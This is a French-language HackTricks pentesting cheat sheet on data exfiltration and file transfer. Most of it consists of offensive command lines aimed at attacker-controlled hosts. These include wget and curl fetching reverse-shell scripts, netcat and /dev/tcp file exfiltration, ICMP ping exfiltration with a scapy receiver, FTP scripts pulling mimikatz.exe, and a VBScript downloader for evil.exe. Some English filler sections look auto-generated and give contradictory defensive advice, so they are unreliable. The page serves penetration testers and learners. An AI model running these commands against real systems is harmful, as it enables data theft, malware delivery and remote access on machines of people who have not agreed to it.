## Exfiltration

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png" alt="" data-size="original">\
**Astuce de prime de bug** : **inscrivez-vous** à **Intigriti**, une plateforme de prime de bug premium créée par des pirates, pour les pirates ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## Copier et coller en Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Télécharger des fichiers

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer affichant les GET et POST (ainsi que les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Module Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Serveur HTTPS**

---

#### **Description**

An HTTPS server is a server that uses the HTTPS protocol to encrypt and secure the communication between the server and the client. This type of server is commonly used to host websites that require secure communication, such as online banking or e-commerce websites.

#### **Exfiltration**

An HTTPS server can be used to exfiltrate data by hosting a file on the server and then downloading it using a web browser or a script. The data can be encrypted using SSL/TLS to ensure that it is not intercepted during transmission.

To exfiltrate data using an HTTPS server, follow these steps:

1. Set up an HTTPS server on a machine that is accessible from the internet.
2. Create a file containing the data that you want to exfiltrate.
3. Host the file on the HTTPS server.
4. Download the file using a web browser or a script.

#### **Detection**

Detecting exfiltration using an HTTPS server can be difficult, as the traffic is encrypted and may be indistinguishable from legitimate HTTPS traffic. However, some indicators of exfiltration may include:

- Unusual or unexpected HTTPS traffic.
- Large amounts of data being transferred over HTTPS.
- Suspicious file names or file types being hosted on the HTTPS server.

#### **Prevention**

To prevent exfiltration using an HTTPS server, consider implementing the following measures:

- Monitor HTTPS traffic for unusual or unexpected activity.
- Implement SSL/TLS encryption to protect data in transit.
- Restrict access to HTTPS servers to authorized personnel only.
- Use strong authentication mechanisms to prevent unauthorized access to HTTPS servers.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)    
@app.route('/')    
def root():    
    print(request.get_json())
    return "OK"
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Serveur FTP (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Serveur FTP (NodeJS)

#### Introduction

Le serveur FTP (File Transfer Protocol) est un protocole de transfert de fichiers largement utilisé pour transférer des fichiers entre des ordinateurs distants. Dans cette section, nous allons discuter de la configuration d'un serveur FTP en utilisant NodeJS.

#### Configuration

Pour configurer un serveur FTP en utilisant NodeJS, nous allons utiliser le module `ftp-srv`. Ce module fournit une API simple pour créer un serveur FTP.

Tout d'abord, nous devons installer le module `ftp-srv` en utilisant la commande suivante :

```bash
npm install ftp-srv
```

Ensuite, nous pouvons créer un serveur FTP en utilisant le code suivant :

```javascript
const FtpSrv = require('ftp-srv');

const ftpServer = new FtpSrv({
  url: 'ftp://127.0.0.1:21',
  pasv_url: 'ftp://127.0.0.1:3000',
  greeting: 'Welcome to my FTP server'
});

ftpServer.on('login', ({connection, username, password}, resolve, reject) => {
  if (username === 'user' && password === 'pass') {
    resolve({root: '/path/to/root/directory'});
  } else {
    reject(new Error('Bad username or password'));
  }
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server listening');
  });
```

Dans ce code, nous avons créé un serveur FTP qui écoute sur l'adresse `ftp://127.0.0.1:21`. Nous avons également spécifié l'adresse `ftp://127.0.0.1:3000` pour le mode passif. Ensuite, nous avons défini un message de bienvenue pour le serveur.

Nous avons également ajouté un gestionnaire d'événements pour l'événement `login`. Dans ce gestionnaire, nous avons vérifié les informations d'identification de l'utilisateur et renvoyé le répertoire racine si les informations d'identification sont valides.

Enfin, nous avons démarré le serveur FTP en appelant la méthode `listen()`.

#### Conclusion

Dans cette section, nous avons discuté de la configuration d'un serveur FTP en utilisant NodeJS. Nous avons utilisé le module `ftp-srv` pour créer un serveur FTP et avons configuré les informations d'identification de l'utilisateur et le répertoire racine.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Serveur FTP (pure-ftp)

---

#### Description

Pure-FTP est un serveur FTP open-source rapide, sécurisé et facile à configurer. Il est souvent utilisé pour transférer des fichiers entre des ordinateurs distants.

#### Exfiltration

Pure-FTP peut être utilisé pour exfiltrer des données en transférant des fichiers depuis le système compromis vers un serveur FTP distant. Pour ce faire, il est nécessaire de configurer le serveur FTP distant et de fournir les informations d'identification nécessaires pour y accéder.

Une fois que le serveur FTP est configuré, il est possible d'utiliser la commande `put` pour transférer des fichiers depuis le système compromis vers le serveur FTP distant. Par exemple :

```
put /path/to/local/file.txt remote_file.txt
```

Cette commande transférera le fichier `file.txt` situé dans le répertoire `/path/to/local/` du système compromis vers le fichier `remote_file.txt` sur le serveur FTP distant.

Il est également possible d'utiliser la commande `mput` pour transférer plusieurs fichiers en une seule fois. Par exemple :

```
mput /path/to/local/files/*.*
```

Cette commande transférera tous les fichiers situés dans le répertoire `/path/to/local/files/` du système compromis vers le serveur FTP distant.

#### Contre-mesures

Pour empêcher l'exfiltration de données via Pure-FTP, il est recommandé de limiter l'accès au serveur FTP distant en utilisant des règles de pare-feu et des listes de contrôle d'accès. Il est également recommandé de surveiller les connexions FTP pour détecter toute activité suspecte.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### Client **Windows**
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali en tant que serveur

### Exfiltration de données

#### Utilisation de smbclient

Si vous avez accès à un partage SMB, vous pouvez utiliser `smbclient` pour télécharger des fichiers.

```bash
smbclient //IP/SHARE -U username%password
smb: \> get file.txt
```

#### Utilisation de smbget

Si vous avez accès à un partage SMB, vous pouvez également utiliser `smbget` pour télécharger des fichiers.

```bash
smbget -U username%password smb://IP/SHARE/file.txt
```

#### Utilisation de impacket

Si vous avez des informations d'identification valides pour un utilisateur sur un domaine, vous pouvez utiliser `impacket` pour exfiltrer des données via SMB.

```bash
impacket-smbclient //IP/SHARE -no-pass -U 'DOMAIN/username%password'
smb: \> get file.txt
```

#### Utilisation de Metasploit

Si vous avez accès à un partage SMB, vous pouvez utiliser le module `smb_download` de Metasploit pour télécharger des fichiers.

```bash
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/admin/smb/smb_download
set RHOSTS IP
set SMBUser username
set SMBPass password
set SHARE SHARE
set FILENAME file.txt
run
```

### Exfiltration de données à partir de Windows

#### Utilisation de PowerShell

Vous pouvez utiliser PowerShell pour exfiltrer des données via SMB.

```powershell
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username',(ConvertTo-SecureString 'password' -AsPlainText -Force))
Copy-Item -Path C:\path\to\file.txt -Destination \\IP\SHARE -Credential $cred
```

#### Utilisation de bitsadmin

Vous pouvez également utiliser `bitsadmin` pour exfiltrer des données via SMB.

```cmd
bitsadmin /transfer mydownloadjob /priority high \\IP\SHARE\file.txt C:\path\to\file.txt
```
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ou créer un partage smb **en utilisant samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

## Introduction

Exfiltration is the process of stealing data from a target system and transferring it to an external location controlled by the attacker. In this section, we will discuss some techniques that can be used to exfiltrate data from a Windows system.

## Techniques

### FTP

FTP (File Transfer Protocol) is a standard network protocol used to transfer files from one host to another over a TCP-based network, such as the Internet. FTP can be used to exfiltrate data from a Windows system by uploading the data to an FTP server controlled by the attacker.

### HTTP

HTTP (Hypertext Transfer Protocol) is an application protocol used for transmitting data over the Internet. HTTP can be used to exfiltrate data from a Windows system by sending the data to a web server controlled by the attacker.

### DNS

DNS (Domain Name System) is a hierarchical and decentralized naming system for computers, services, or other resources connected to the Internet or a private network. DNS can be used to exfiltrate data from a Windows system by encoding the data in DNS queries and sending them to a DNS server controlled by the attacker.

### ICMP

ICMP (Internet Control Message Protocol) is a network protocol used to send error messages and operational information about network conditions. ICMP can be used to exfiltrate data from a Windows system by encoding the data in ICMP packets and sending them to a server controlled by the attacker.

### SMB

SMB (Server Message Block) is a network protocol used for sharing access to files, printers, and other resources between nodes on a network. SMB can be used to exfiltrate data from a Windows system by uploading the data to an SMB server controlled by the attacker.

### Email

Email can be used to exfiltrate data from a Windows system by sending the data to an email account controlled by the attacker.

## Conclusion

Exfiltration is a critical step in the attack lifecycle, and it is important for defenders to be aware of the various techniques that can be used to exfiltrate data from a Windows system. By understanding these techniques, defenders can better protect their systems and data from attackers.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

L'attaquant doit avoir SSHd en cours d'exécution.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename> 
```
## SSHFS

Si la victime dispose de SSH, l'attaquant peut monter un répertoire de la victime vers l'attaquant.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) est un outil de réseau qui peut être utilisé pour transférer des données entre deux ordinateurs. Il peut être utilisé pour l'exfiltration de données en établissant une connexion entre la machine cible et la machine de l'attaquant. Une fois la connexion établie, les données peuvent être transférées de la machine cible à la machine de l'attaquant. NC peut également être utilisé pour écouter les connexions entrantes et recevoir des données de la machine cible.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Télécharger un fichier depuis la victime
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Télécharger un fichier sur la victime
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

Le protocole ICMP (Internet Control Message Protocol) est utilisé pour envoyer des messages d'erreur et de contrôle entre les hôtes sur un réseau IP. Les messages ICMP sont généralement utilisés pour diagnostiquer et résoudre les problèmes de connectivité réseau.

L'exfiltration de données via ICMP implique l'encapsulation des données dans des paquets ICMP. Les données sont divisées en fragments et encapsulées dans des paquets ICMP Echo Request. Les paquets ICMP sont ensuite envoyés à un hôte distant qui est configuré pour recevoir les paquets et extraire les données.

L'exfiltration de données via ICMP peut être difficile à détecter car les paquets ICMP sont souvent autorisés à travers les pare-feu et les dispositifs de sécurité réseau. Cependant, cette technique peut être détectée en surveillant le trafic réseau pour les paquets ICMP volumineux ou inhabituels.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un serveur SMTP pour recevoir les données avec Python :
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Par défaut dans XP et 2003 (dans d'autres, il doit être explicitement ajouté lors de l'installation)

Dans Kali, **démarrer le serveur TFTP** :
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Serveur TFTP en python:**

```python
import socketserver
import struct

class TFTPServer(socketserver.UDPServer):
    def __init__(self, server_address, RequestHandlerClass):
        socketserver.UDPServer.__init__(self, server_address, RequestHandlerClass)

class TFTPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, socket = self.request
        opcode = struct.unpack("!H", data[:2])[0]
        if opcode == 1:
            filename = data[2:data.index(b'\0', 2)].decode('ascii')
            mode = data[data.index(b'\0', 2)+1:data.index(b'\0', data.index(b'\0', 2)+1)].decode('ascii')
            print("File requested: %s" % filename)
            print("Mode: %s" % mode)
            with open(filename, "rb") as f:
                file_data = f.read()
            block_num = 1
            while True:
                block = file_data[(block_num-1)*512:block_num*512]
                if not block:
                    break
                packet = struct.pack("!H", 3) + struct.pack("!H", block_num) + block
                socket.sendto(packet, self.client_address)
                block_num += 1
        else:
            print("Unknown opcode: %d" % opcode)

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 69
    server = TFTPServer((HOST, PORT), TFTPHandler)
    server.serve_forever()
```

Ce code est un exemple de serveur TFTP écrit en Python. Le serveur écoute sur toutes les interfaces sur le port 69. Lorsqu'un client envoie une demande de fichier, le serveur répond avec le contenu du fichier demandé. Le serveur est capable de gérer les demandes de fichiers en mode netascii et octet.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Dans **la victime**, connectez-vous au serveur Kali :
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Téléchargez un fichier avec une commande PHP en une ligne :
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) est un langage de script Microsoft basé sur Visual Basic. Il est souvent utilisé pour automatiser des tâches dans les environnements Windows. VBScript peut être utilisé pour exfiltrer des données en utilisant des méthodes telles que l'envoi de courriels ou l'écriture de fichiers sur le disque dur. Il peut également être utilisé pour exécuter des commandes système et accéder à des ressources réseau. Les attaquants peuvent utiliser VBScript pour exfiltrer des données sensibles d'un système compromis.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Victime**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Il s'agit d'une technique folle qui fonctionne sur les machines Windows 32 bits. L'idée est d'utiliser le programme `debug.exe`. Il est utilisé pour inspecter les binaires, comme un débogueur. Mais il peut également les reconstruire à partir de l'hexadécimal. L'idée est donc que nous prenions des binaires, comme `netcat`. Et puis le désassembler en hexadécimal, le coller dans un fichier sur la machine compromise, puis l'assembler avec `debug.exe`.

`Debug.exe` ne peut assembler que 64 ko. Nous devons donc utiliser des fichiers plus petits que cela. Nous pouvons utiliser upx pour le compresser encore plus. Alors faisons cela:
```
upx -9 nc.exe
```
Maintenant, il ne pèse que 29 ko. Parfait. Maintenant, désassemblons-le :
```
wine exe2bat.exe nc.exe nc.txt
```
Maintenant, nous copions-colons simplement le texte dans notre shell Windows. Et cela créera automatiquement un fichier appelé nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png" alt="" data-size="original">\
**Astuce de prime de bug bounty**: **inscrivez-vous** sur **Intigriti**, une plateforme premium de **bug bounty créée par des hackers, pour des hackers**! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
